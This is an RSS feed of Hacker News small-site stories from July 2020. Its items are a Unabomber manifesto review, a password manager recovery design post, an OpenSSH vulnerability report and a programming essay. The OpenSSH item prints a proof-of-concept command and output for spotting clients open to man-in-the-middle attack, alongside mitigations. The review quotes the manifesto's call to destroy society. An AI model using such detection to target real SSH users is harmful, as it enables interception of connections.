<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Wed, 08 Jul 2020 04:16:52 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Wed, 08 Jul 2020 04:16:52 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[If you're a techno-optimist, you should read the Unabomber Manifesto]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=23746087">thread link</a>) | @roelp_be
<br/>
July 6, 2020 | https://www.roelpeters.be/industrial-society-and-its-future-the-intelligent-yet-angry-writings-of-a-terrorist/ | <a href="https://web.archive.org/web/*/https://www.roelpeters.be/industrial-society-and-its-future-the-intelligent-yet-angry-writings-of-a-terrorist/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<h2>Preface to this blog post</h2>



<p>Why review a book from the hand of a notorious terrorist who killed three and maimed dozens of people? That seems like the right question to answer before continuing this blog post. <a href="https://en.wikipedia.org/wiki/Ted_Kaczynski">Theodore J. Kaczynski</a> is an extremely intelligent yet wounded man. He’s been a victim of cold-war era social experiments and, throughout his life, has always been an outsider. He retreated from society and lived like a hermit in the woods in Montana. Nevertheless, he was an activist in search of attention for his ideology and manifesto.</p>



<p>Numerous human lives have been sacrificed on the altars of freedom, ideology, and a better world. Wherever you position yourself on the political spectrum, from left to right, your heroes have blood on their hands. Reagan, Lenin, Bush, Mao, Napoleon, Robespierre, Obama, Chavez, Macron, Selassie, and Guevara, in one way or another, are responsible for the death and suffering of many. Yet we read their memoirs, manifestoes, and biographies. We have their posters on the walls of our children’s rooms. In this light, <strong>the refusal to read and review <em>Industrial Society and its Future</em> would be an act of hypocrisy. </strong></p>



<p>Finally, the central claim that technology is inherently bad for society is of relevance to this blog. I completely distance myself from the man’s actions, but his manifesto definitely struck a chord. I currently cannot think of a better way to scrutinize my techno-optimism than to write about it.</p>



<h2>The Power Process</h2>



<p><em>Industrial Society and its Future</em> is an essay of 232 numbered paragraphs in which Kaczynski explains what’s wrong with society, how it should be, and how we can get there. The most interesting parts of the essay describe the core concept of the <em>Power Process</em>, its consequences, and how technology has an impact on it.</p>



<p><strong>Human drives</strong> can be classified in three broad categories:</p>



<ul><li>Drives that can be satisfied with minimal effort: a walk around the block.</li><li>Drives that can be satisfied at the cost of serious effort: chopping down a tree for burning wood.</li><li>Drives that cannot be satisfied, no matter the effort one puts in it: somersault from a high cliff and survive it</li></ul>



<p>Kaczynski claims that <strong>all humans need a power process</strong>: (1) we all need goals, (2) effort to attain them, and (3) the attainment of some of these goals. Finally, it requires a degree of (4) autonomy. Consequently, the power process is part of the second category of human drives.</p>



<p>If unattained goals result in death, they are important. If the non-attainment of one’s goals is compatible with survival (i.e. not important), it will lead to defeatism, low self-esteem, and depression (as I explain later on). In the Western world, one only needs minimum effort to survive. Satisfying biological needs has been reduced to triviality. One can live off welfare checks, or have a bullshit job to satisfy physical needs. The only thing required is a minimal degree of obedience. Humans have given up autonomy and effort to attain the needs to survive — the important goals.  That’s why humans artificially create the four components of the power process for themselves: they are involved in <strong>surrogate activities</strong>: long-distance running, blogging, collecting stamps, gardening and even pursuing an academic career. </p>



<h2>Technology messes with the power process</h2>



<p>Kaczynski distinguishes between <strong>two kinds of technology</strong>: The first one is <strong>small-scale technology</strong>, like a mill or a water wheel. The second kind is <strong>organization-dependent technology</strong> that requires large-scale social organization: A refrigerator depends on complicated and industrially created parts and requires electricity. The first kind can produce real progress and freedom. The second kind has a negative impact on our freedom: the externalities outweigh the benefits. It’s <a href="https://en.wikipedia.org/wiki/Prisoner%27s_dilemma">the prisoner’s dilemma</a> on a global scale.</p>



<p>Since the Industrial Revolution, most new technologies are of the second kind. The wave of <em>smart</em> and <em>connected</em> devices and software that’s heading our way is no different. Algorithms can curate all available information on our timelines, only inviting more and more (fake?) articles to be produced. Autonomous cars are safer and offer the freedom to keep the hands of the wheel. Yet as self-driving cars are simply sensors on wheels, you will have zero privacy regarding your location. Self-service checkouts are supposed to be faster. Yet as supermarket customers more often use them, fewer registers with cashiers will be available, reducing human personal contact. Oh, and you need a loyalty card, which is digital-only, for which you need a smartphone.</p>



<p>Social and psychological problems arise when humans cannot go through the power process. <strong>In modern society, technology (especially of the second kind) tends to push drives into the first group</strong>: gathering food is now <a href="https://www.ubereats.com/">one tap away</a>.  Intimacy can be achieved by <a href="https://tinder.com/">swiping</a> or paying a <a href="https://www.pornhub.com/live">minimum fee</a>. Leisure can be found on <a href="https://www.netflix.com/be-en/">Netflix</a> or <a href="https://store.steampowered.com/">Steam</a>. Turn up the heat by asking your <a href="https://store.google.com/us/magazine/compare_thermostats">Nest</a>. </p>



<p>On the other hand,<strong> technology also moved other drives into the third category</strong>. With urbanization reaching record numbers; experiencing authenticity, harmony, nature, silence, and clean air is nearly impossible for many inhabitants of this planet.</p>



<p><strong>Some important goals that remain in the second category, like achieving status, can no longer be done autonomously</strong>. To reach the highest echelons of the corporate ladder, one needs to adhere to company culture, engage in networking, and pass opaque assessments. A management position is often at the goodwill of another manager, higher up.</p>



<p>The primitive man only had to fear disease and certain aspects of the environment. He could accept this stoically, or invent gods and demons. But these problems weren’t man-made, imposed on them by someone’s decision which he had no impact on. Although many of us create them for themselves, for others,<strong> surrogate activities do not suffice. The results are aggression, mental breakdowns, burnouts, depressions, mid-life crises, and declining fertility.</strong> As decisions are increasingly outsourced to <a href="https://www.propublica.org/article/machine-bias-risk-assessments-in-criminal-sentencing"><em>trustworthy </em>and <em>unbiased</em> machines</a> — think<a href="https://www.nytimes.com/2020/01/12/technology/facial-recognition-police.html"> facial recognition by police departments</a>, or <a href="https://www.technologyreview.com/2019/01/21/137783/algorithms-criminal-justice-ai/">algorithms sending people to jail</a> — hopelessness and rebellion will only increase.</p>



<p>In modern society, mental health is defined by how one behaves in accord with the needs of the system.</p>



<h2>Technology is a rational response to problems</h2>



<p>A compromise between freedom and technology is impossible because technology is a more powerful social force than the aspiration for freedom. That’s because each new technology appears to be desirable<strong> and only threatens our freedom later on</strong>. Motorized transport allows us to travel a lot farther. Yet once the adoption of cars reaches a critical threshold, one is <em>expected</em> to own a car: Local shops and public services disappear and become centralized in malls and government buildings. The internet allowed us to communicate with each other faster than ever. As companies adopted the internet, one can no longer apply for a job without an internet connection. Technology changes society as to make itself indispensable.</p>



<p>The following words read like a prophecy: “<em>Generally speaking, <strong>technological control over human behavior will probably not be introduced with a totalitarian intention</strong> or even through a conscious desire to restrict human freedom. Each new step in the assertion of control over the humankind will be taken as a rational response to a problem that faces society…”</em></p>



<p>For example, society has given up privacy to battle COVID-19 with apps and track&amp;trace strategies. Facebook promised us freedom of speech and unlimited reach, but without the financial means, you’re <a href="https://blog.hootsuite.com/facebook-algorithm/">shouting in a vacuum</a>. The Patriot Act (and the <a href="https://www.aclu.org/issues/national-security/privacy-and-surveillance/surveillance-under-patriot-act">mass surveillance technology</a> that came with it) was designed to battle terrorism but introduced legal arbitrariness. These three examples were all <strong>rational responses to existing problems but produced unforeseen externalities</strong>.</p>



<p>As technology makes itself indispensable, machines will take care of more and more tasks and “<em>on those who are employed, ever-increasing demands will be placed: the will need more training, more and more ability, and will have to be ever more reliable, conforming and docile, because they will be more and more like cells of a giant organism.</em>“</p>



<p>Think of the swarm of Uber or Lyft drivers who took a short training on how to use the app and are now driving people around in servile silence. Their data feeds the algorithm, and the algorithm thinks for them. <strong>The only thing left is to abide by the system.</strong></p>



<h2>Revolution</h2>



<p>Which brings us to Kaczynski’s “solution”. This topic lacks the depth and cunning analogies that can be found in the earlier chapters. His recipes aren’t new: one can find elements of <a href="https://en.wikipedia.org/wiki/Mikhail_Bakunin">Bakunist</a>, <a href="https://en.wikipedia.org/wiki/Cultural_hegemony">Gramscist</a>, and <a href="https://en.wikipedia.org/wiki/Foco">Debrayist</a> thinking.</p>



<p>Because technology is the strongest social force, <strong>gradual change is impossible</strong>. The only way to break this circle, this slippery slope to servitude to the machine, is a revolution. While the system might collapse under its own internal difficulties, Kaczynski claims we should promote social stress and instability in industrial society. Humanity should return to nature to live in small groups and to be in control of life-and-death issues: food, clothing, shelter, and defense. This is true freedom: the power to control the circumstances of one’s own life. It’s not an ideology, it’s Nature with a big N:</p>



<p><em>“We have no illusions about the feasibility of creating a new, ideal form of society. Our goal is only to destroy the existing form of society.”</em></p>



<h2>Final thoughts</h2>



<p>Manifestos are always dull, so I didn’t expect this book to be an enjoyable read. But quite a lot of insights were so masterfully crafted, that I often had to allow my mind to wander off in a quest to find (counter-)examples and arguments to what I just read. If you’re into political theory, this will be a treat.</p>



<p>Nevertheless, the structure of the book and the order of the chapters seemed strange to …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.roelpeters.be/industrial-society-and-its-future-the-intelligent-yet-angry-writings-of-a-terrorist/">https://www.roelpeters.be/industrial-society-and-its-future-the-intelligent-yet-angry-writings-of-a-terrorist/</a></em></p>]]>
            </description>
            <link>https://www.roelpeters.be/industrial-society-and-its-future-the-intelligent-yet-angry-writings-of-a-terrorist/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23746087</guid>
            <pubDate>Mon, 06 Jul 2020 09:26:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[New Stockholm Rail Network Map]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23745992">thread link</a>) | @omelekhin
<br/>
July 6, 2020 | https://spartrafikkarta.se/en | <a href="https://web.archive.org/web/*/https://spartrafikkarta.se/en">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://spartrafikkarta.se/en</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745992</guid>
            <pubDate>Mon, 06 Jul 2020 09:06:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: 0 Password, never losing your password manager password]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23745988">thread link</a>) | @AutumnWu
<br/>
July 6, 2020 | https://www.bluespace.tech/blog/0password/ | <a href="https://web.archive.org/web/*/https://www.bluespace.tech/blog/0password/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        
        
        <p><img src="https://www.bluespace.tech/blog/0password/forgot-password.png"></p>
        <p>A few months ago, Scott Stein shared an article on CNet, <a href="https://www.cnet.com/news/password-managers-great-until-you-lose-access-world-password-day/">Password managers are great -- until you lose your password manager password</a>. Many people shared and retweeted the article. You know that feeling if you ever lost the password to your password manager.</p>
        <h2 id="why-do-password-managers-require-a-master-password">Why do password managers require a master password?</h2>
        <p>The earliest first generation password managers can manage passwords, by keeping them somewhere, but not protect them well.</p>
        <p>About 20 years ago, <a href="https://en.wikipedia.org/wiki/PBKDF2">PBKDF2</a> was recommended as a standard. It transforms a simple password into a complex key which can be used in cryptographic algorithms.</p>
        <p>Since then, lots of second and third generation password managers have been emerging. They derive encryption key from master password, then encrypt user data with the key. This is how it works:</p>
        <pre>            <code><p>graph TD

            subgraph 1. key derivation

            password --&gt; PBKDF2(PBKDF2)
            salt --&gt; PBKDF2
            PBKDF2 --&gt;|derive| key[[key]]

            end

            subgraph 2. encryption

            key --&gt; AES(AES)
            plaintext --&gt; AES
            AES --&gt; |encrypt| ciphertext[(ciphertext)]

            end

            style password fill:#fff, stroke: #aaa
            style ciphertext fill: #ddd, stroke: #aaa
            style salt fill:#fff
            style plaintext fill:#fff, stroke: #aaa
            </p></code>
        </pre>
        <blockquote>
        <p>In cryptography,</p>
        <ul>
        <li><code>plaintext</code> is unencrypted data intended to be encrypted;</li>
        <li><code>ciphertext</code> is the output of encryption of <code>plaintext</code>.</li>
        </ul>
        </blockquote>
        <p>To get the <code>plaintext</code> back, password managers derive the key just as above, but perform decrypt operation instead of encrypt operation in the second step.</p>
        <pre>            <code><p>graph TD

            subgraph 1. key derivation

            password --&gt; PBKDF2(PBKDF2)
            salt --&gt; PBKDF2
            PBKDF2 --&gt;|derive| key[[key]]

            end

            subgraph 2. decryption

            key --&gt; AES(AES)
            ciphertext[(ciphertext)] --&gt; AES
            AES --&gt; |decrypt| plaintext

            end

            style password fill:#fff, stroke: #aaa
            style salt fill:#fff
            style plaintext fill:#fff, stroke: #aaa
            style ciphertext fill:#ddd, stroke: #aaa
            </p></code>
        </pre>
        <p>I will not go deep for it in this article. If you are interested in the details, please checkout this series <a href="https://www.bluespace.tech/blog/evolution-of-password-manager/">The evolution of password manager</a>.</p>
        <p>Essentially, to encrypt user data, password managers must rely on some <strong>secret controlled by the user</strong>, so that hackers cannot get data from the ciphertext.</p>
        <h2 id="secret-in-security-chip">Secret in security chip</h2>
        <p><img src="https://www.bluespace.tech/blog/0password/security-chip.png" alt=""></p>
        <p><a href="https://developer.android.com/guide/topics/connectivity/nfc/hce#SecureElement">NFC card emulation with a secure element in Android.</a></p>
        <p>Nowadays, most smartphones, except some low-end ones, are equipped with a dedicated security chip(Trusted Execution Environment, Secure Element, or Secure Enclave in iOS). Emulated payment cards in iPhone and Android wallet apps are secured by this chip.</p>
        <p>Our fourth generation password manager, ID Guard Offline, can be safely used without a master password. The secret for encryption can be secured by the chip which is much more reliable than human brain. Again, if you are interested in how it works, please checkout <a href="https://www.bluespace.tech/blog/evolution-of-password-manager/fourth-generation-password-manager.html">The Evolution of Password Manager (4/4)</a>.</p>
        <h3 id="master-password">Master password</h3>
        <p>Scott Stein, the CNet staff, lost all his passwords because of forgetting master password. It is the nature of the algorithm above. In addition to using security chip protection, ID Guard Offline also offers master password protection (users can choose whether to use it). So our users may also encounter the same problem. We believe that availability is just as important as confidentiality to password managers and we need to resolve that problem.</p>
        <p>Some password manager providers allow user to reset master password, Google for example. If a user can reset master password and continue to view passwords stored previously, then those passwords are not secured by the master password.</p>
        <p>Our team of course do not compromise on security. The master password can never be reset. Then, is it possible to get the master password back when our user cannot recall it?</p>
        <h3 id="find-back-my-password">Find back my password</h3>
        <p>Some social services offer user account recovery with the help of trusted contacts when the user forgets the password. Here is how it works.</p>
        <ul>
        <li>The user is required to ask his/her trusted contacts to accomplish some tasks(e.g. sending a code).</li>
        <li>The service detects whether those trusted contacts complete the tasks.</li>
        <li>If so, the service lets the user login and asks he/she to reset password.</li>
        </ul>
        <p>Inspired by this, we have a simple idea: ask friends to help find password back. And finally, we perfected this design after several iterations.</p>
        <ol>
        <li>
            <p>Ask friends to save my password</p>
            
            <p>The first idea coming into our minds was just asking friends to save the password. When forgetting the password, ask a friend to tell me the password. It's like asking a friend to keep my house keys temporarily.</p>
            
            <p><img src="https://www.bluespace.tech/blog/0password/key.jpg" alt=""></p>
            
            <p>Obviously, this is not safe. Passwords are always meant to be kept secretly. Lots of users reuse their passwords, one leaked password can endanger a large number of accounts.</p>
            

        </li>
        <li>
            <p>Encrypt the password then send to friends</p>
            
            <p>Encryption is a good idea. The problem is how to choose/derive the encryption key. We cannot ask user to set another password to encrypt the password, right?</p>
            
            <img src="https://www.bluespace.tech/blog/0password/russian-doll.jpg" alt="">
            
            <p>Stay safe</p>
            
            <p>If the encryption does not depend on user's secret, the encryption key must be hardcoded. We will not make <a href="https://team-sik.org/sik-2016-022/">the same mistake like other password managers did years ago</a>.</p>
            
        </li>
        <li>
        <p>Encrypt the password with a key inside the security chip on smartphone, and send only the <code>ciphertext</code> to friends</p>
        <pre>            <code>
                <p>graph TD

                key[[key]] --&gt; AES(AES)
                password --&gt; AES
                AES --&gt;|encrypt| ciphertext[(password file)]

                key --&gt; phone[Secure Element]
                ciphertext --&gt; friend[saved by friend]

                style password fill:#fff, stroke: #aaa
                style ciphertext fill: #ddd, stroke: #aaa
                style phone fill: #b3d26a
                style friend fill: #acf
                </p></code>
            </pre>
            <p>In this proposal, a password file(<code>ciphertext</code>) is kept by each friend, but the <code>keys</code> are secured by the security chip on the phone.
            The password can be decrypted if a friend sends back the password file, when finding back the password.</p>
            <pre>                <code><p>graph TD

                subgraph 1. find back password

                masterPasswordKey[[key]] --&gt; masterPasswordAes(AES)
                masterPasswordCiphertext[(password file)] --&gt; masterPasswordAes
                masterPasswordAes --&gt;|decrypt| password

                end

                subgraph 2. key derivation

                password --&gt; PBKDF2(PBKDF2)
                salt --&gt; PBKDF2
                PBKDF2 --&gt;|derive| key[[key]]

                end

                subgraph 3. decryption

                key --&gt; AES(AES)
                ciphertext[(ciphertext)] --&gt; AES
                AES --&gt; |decrypt| plaintext

                end

                style masterPasswordCiphertext fill: #ddd, stroke: #aaa
                style password fill:#fff, stroke: #aaa
                style ciphertext fill: #ddd, stroke: #aaa
                style salt fill:#fff
                style plaintext fill:#fff, stroke: #aaa
                </p></code>
            </pre>
        <p>Friends are required to save the password file into ID Guard Offline, which is secured by the security chip on the phone. So hackers cannot steal the password file. This finding back master password mechanism does not weaken the security of the data stored in ID Guard Offline.</p>
        <ul>
        <li>If a hacker steals a user's phone and unlocks it(by screen PIN), he/she still needs to enter the master password.
        <ul>
        <li>If the hacker does not know the master password, he/she has to steal and unlock the phone of a friend, and crack ID Guard Offline app on that friend's phone, which is really hard.</li>
        </ul>
        </li>
        <li>If a hacker cracks and gets the password file from a friend, he/she cannot decrypt the ciphertext without the encryption key inside the security chip on the user's phone.</li>
        </ul>
        </li>
        </ol>
        <h3 id="how-to-setup-and-find-back-the-password">How to setup and find back the password?</h3>
        <p>So how to use it?</p>
        <ol>
        <li>
            <p>If you are using master password to unlock the app, go to the <code>Find back master password</code> setup view, enter your friend's name, and touch <code>Send</code> button.</p>
            
            <p><img src="https://www.bluespace.tech/blog/0password/send-password-file.png" alt=""></p>
            
        </li>
        <li>
            <p>Send the password file to your friend and ask him/her to save it in ID Guard Offline.</p>
            
            <p><img src="https://www.bluespace.tech/blog/0password/save-password-file.png" alt=""></p>
            
        </li>
        <li>
            <p>If you forget your master password, you can check out the list of friends who can help you.</p>
            
            <p><img src="https://www.bluespace.tech/blog/0password/friend-list.png" alt=""></p>
            
        </li>
        <li>
            <p>Ask a friend to send back the password file, open it with ID Guard Offline to unlock it. You need to change unlock method immediately.</p>
            
            <p><img src="https://www.bluespace.tech/blog/0password/unlock-successfully.png" alt=""></p>
            
        </li>
        </ol>
        <h3 id="comparison">Comparison</h3>
        <h4 id="recover-account-with-trusted-contacts">Recover account with trusted contacts</h4>
        <p>Trusted contacts must be very trustworthy when using the account recovery feature offered by social services. Otherwise, those "bad friends" can hack into my account by initializing the account recovery process and completing the tasks required by the service.</p>
        <p>We borrow the idea from social services, but in our design, friends can be somewhat dependable because they cannot decrypt my passwords without the key. Also, I can get my password back as long as one of my friends can give me the password file.</p>
        <h4 id="password-managers-can-reset-master-password">Password managers can reset master password</h4>
        <p>Both those …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.bluespace.tech/blog/0password/">https://www.bluespace.tech/blog/0password/</a></em></p>]]>
            </description>
            <link>https://www.bluespace.tech/blog/0password/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745988</guid>
            <pubDate>Mon, 06 Jul 2020 09:06:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Critical flaw in OpenSSH Client allows targeted man-in-the-middle (MitM) attacks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23745977">thread link</a>) | @darshansavla
<br/>
July 6, 2020 | https://androidrookies.com/critical-flaw-in-openssh-client-versions-5-7-to-8-3-allows-targeted-man-in-the-middle-mitm-attacks/ | <a href="https://web.archive.org/web/*/https://androidrookies.com/critical-flaw-in-openssh-client-versions-5-7-to-8-3-allows-targeted-man-in-the-middle-mitm-attacks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-8464"><div><div><div><h2>Researchers find critical flaw in OpenSSH Client versions 5.7 to 8.3 that allows targeted MitM attacks using information leakage in SSH Clients</h2><p>Security researchers from German security firm FZI have found a critical flaw in the OpenSSH Client version 5.7 to 8.3. The critical vulnerability in OpenSSH clients lies due to an information leak in the initial key exchange message of the SSH protocol.</p><p>OpenSSH Client is an SSH client is a program that allows users to establish a secure and authenticated SSH connections to SSH servers. The OpenSSH source code is available free to everyone via the Internet. The devs had released the OpenSSH Client version 8.3 on 27th May 2020. However, the security researchers from FZI say that even the newly released version is susceptible to MITM attack due to the flaw.</p><p>The OpenSSH Client flaw has <strong>Observable Discrepancy</strong> leading to an information leak in the algorithm negotiation. This allows man-in-the-middle attackers to target initial connection attempts (where no host key for the server has been cached by the client). The OpenSSH Client vulnerability has been issued the identifier – <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-14145">CVE­-2020-­14145</a> and has a severity score of 4.7/10.</p><p>FZI says that any potential hacker can detect if an SSH client using the default configuration stores a host key for the target server. Once this is detected, the hacker can conduct a man-in-the-middle (MITM) attack on the clients that connect to a server for the first time and avoid clients that would show a warning because of a changed host key. Clients that connect to a server for the first time, ask the user to confirm the fingerprint of the host key. Users that compare the shown fingerprint by a known value are safe. However, many users rely on trust on first use and accept host keys without verification. These types of users are vulnerable to the MITM attack.</p><p>FZI states that they tested out their Proof of Concept in OpenSSH 8.2 and 8.3 portable and the tests showed that the host key algorithm list differs from the default list for all algorithm types that are not certificate-based, namely ECDSA, Ed25519, and RSA. This means that in the default configuration an attacker can identify users connecting to a server for the first time without false positives.</p><h2>Proof of Concept</h2><blockquote><p>$ ./ssh-detect.py -r OpenSSH-8.2-init.pcap<br> Client Key Exchange Init 192.168.102.1:33580 -&gt; 192.168.102.134:22</p><p>Host Key Algorithms:<br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="ea8f898e998bc799828bd8c78483999e9ad8dfdcc7898f989ec79cdadbaa859a8f84999982c4898587">[email&nbsp;protected]</a><br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="ed888e899e8cc09e858cdfc083849e999dded5d9c08e889f99c09bdddcad829d88839e9e85c38e8280">[email&nbsp;protected]</a><br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="3c595f584f5d114f545d0e1152554f484c090e0d115f594e48114a0c0d7c534c59524f4f54125f5351">[email&nbsp;protected]</a><br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="dcafb7f1b9bfb8afbdf1afb4bdeef1b2b5afa8aceee9eaf1bfb9aea8f1aaeced9cb3acb9b2afafb4f2bfb3b1">[email&nbsp;protected]</a><br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="90e3e3f8bdf5f4a2a5a5a1a9bdf3f5e2e4bde6a0a1d0ffe0f5fee3e3f8bef3fffd">[email&nbsp;protected]</a><br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="17647c3a64647f3a7273252222262e3a747265633a612726577867727964647f3974787a">[email&nbsp;protected]</a><br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="becccddf93cdd6df8c938b8f8c93dddbccca93c88e8ffed1cedbd0cdcdd690ddd1d3">[email&nbsp;protected]</a><br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="1e6c6d7f336d767f2c332c2b28337d7b6c6a33682e2f5e716e7b706d6d76307d7173">[email&nbsp;protected]</a><br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="3a4949521748495b17595f484e174c0a0b7a554a5f5449495214595557">[email&nbsp;protected]</a><br> ecdsa-sha2-nistp256<br> ecdsa-sha2-nistp384<br> ecdsa-sha2-nistp521<br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="35465e18505651465418465d5407185b5c464145070003755a45505b46465d1b565a58">[email&nbsp;protected]</a><br> ssh-ed25519<br> <a href="https://androidrookies.com/cdn-cgi/l/email-protection" data-cfemail="92e1f9bfe1e1fabff7f6a0a7a7a3abd2fde2f7fce1e1fabcf1fdff">[email&nbsp;protected]</a><br> rsa-sha2-512<br> rsa-sha2-256<br> ssh-rsa</p><p>Client Version: SSH-2.0-OpenSSH_8.2 (known)<br> Default algorithm list detected! Client doesn’t store host key.</p></blockquote><p>FZI states that they notified the OpenSSH Client devs about the vulnerability but they have taken no action. However, the GitHub page of OpenSSH Client shows that devs are working on version 8.4. But it is not known whether the new version will patch the <a href="https://nvd.nist.gov/vuln/detail/CVE-2020-14145">CVE­-2020-­14145</a> vulnerability.</p><h2>Mitigation of the OpenSSH Client vulnerability</h2><p>FZI says there are some configuration options in OpenSSH Client that can be used to mitigate the vulnerability. OpenSSH Client provides users alternative ways to validate host keys, namely SSHFP records and host certificates. These should be used if DNSSEC or a PKI are available.&nbsp; They can also enable UpdateHostKeys and set the option HostKeyAlgorithms after connecting to each server at least once.</p><p>You can download the FZI’s OpenSSH Client vulnerability report <a href="https://www.fzi.de/fileadmin/user_upload/2020-06-26-FSA-2020-2.pdf">here</a>(PDF).</p></div></div></div></article><div><h3>About Author</h3><section> <img alt="" src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20100%20100'%3E%3C/svg%3E" data-src="https://secure.gravatar.com/avatar/076b4a64b03cee86288f1132004881ab?s=100&amp;d=mm&amp;r=g" data-srcset="https://secure.gravatar.com/avatar/076b4a64b03cee86288f1132004881ab?s=200&amp;d=mm&amp;r=g 2x" height="100" width="100" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="><div> <p>Hacker, coder, Jouno by night
When a good man is hurt, all who would be called good must suffer with him</p></div></section></div></div>]]>
            </description>
            <link>https://androidrookies.com/critical-flaw-in-openssh-client-versions-5-7-to-8-3-allows-targeted-man-in-the-middle-mitm-attacks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23745977</guid>
            <pubDate>Mon, 06 Jul 2020 09:04:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Fatal Flaw of Ownership Semantics]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23745863">thread link</a>) | @signa11
<br/>
July 6, 2020 | https://www.gingerbill.org/article/2020/06/21/the-ownership-semantics-flaw/ | <a href="https://web.archive.org/web/*/https://www.gingerbill.org/article/2020/06/21/the-ownership-semantics-flaw/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<article>
<header>
	
	
	<p>
		<span>2020-06-21</span>
		</p>
</header>
<p>I have been toying with a theoretical idea for the past 18 months off-and-on in my head and I have not fully articulated it aloud yet. It is regarding the concept of <em>Ownership Semantics</em> (OS) or <em>Move Semantics</em> in programming languages. Fundamentally this article is a criticism of the concept and states that the concept is a duality of traditional OOP but applied to a different area.</p>
<h2 id="general-definitions-of-terminology">General Definitions of Terminology</h2>
<p>A general list of definitions of terminology used within this article in order to minimize confusion.</p>
<ul>
<li>
<p>A <em>Value</em> is a datum with an associated type</p>
</li>
<li>
<p>A <em>(Data) Type</em> is an attribute of a value which encodes information about how the data value can be operated upon</p>
</li>
<li>
<p>An <em>Object</em> is a value with associated behaviour, and thus implies it has <em>agency</em></p>
</li>
<li>
<p>A <em>Class</em> is the data type of an <em>Object</em></p>
</li>
<li>
<p>A hierarchy of value ownership is a hierarchy of responsibility of values</p>
</li>
<li>
<p>An <em>Owned-Value</em> is a value which belongs to a hierarchy of value ownership, which implies it is governed by an <em>agent</em></p>
</li>
<li>
<p>An <em>Agent</em> is an actor with the capacity to act within a given environment</p>
</li>
<li>
<p>A <em>Model of Interpretation</em> is a way to view and analyse a subject</p>
</li>
<li>
<p>A <em>Paradigm</em> is a way of classifying models of structure of programming languages; a <em>Paradigm</em> is a <em>model of interpretation</em></p>
</li>
<li>
<p><em>Object Orient(at)ed Programming (OOP)</em> - A paradigm of structuring a program around the sole concept of <em>Objects</em>, commonly through coupling data and code into a single unit.</p>
</li>
<li>
<p><em>Ownership/Move Semantics (OS)</em> - Orientation around responsibility of values in a hierarchical fashion</p>
</li>
</ul>
<h2 id="foundations-of-the-object-orientation-paradigm">Foundations of the Object Orientation Paradigm</h2>
<p>Though the original conception of the term coined by Alan Kay<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> was never used as he intended it to be, the term <em>Object Orient(at)ed Programming (OOP)</em> has been commonly understood to be a paradigm of structuring a program around the concept of <em>Objects</em>, commonly through coupling data and code into a single unit. Many languages support multiple paradigms, including aspects for the OOP paradigm, but I would class those as multiparadigm rather than being <em>solely</em> an OOP language.</p>
<p>Most languages implement <em>Objects</em> and <em>Classes</em> in the Simula tradition; most of the notable OOP languages have a similar form by defining methods (member functions) within the class definition. Traditionally languages such as Java can be classed as <em>solely</em> an OOP language.</p>
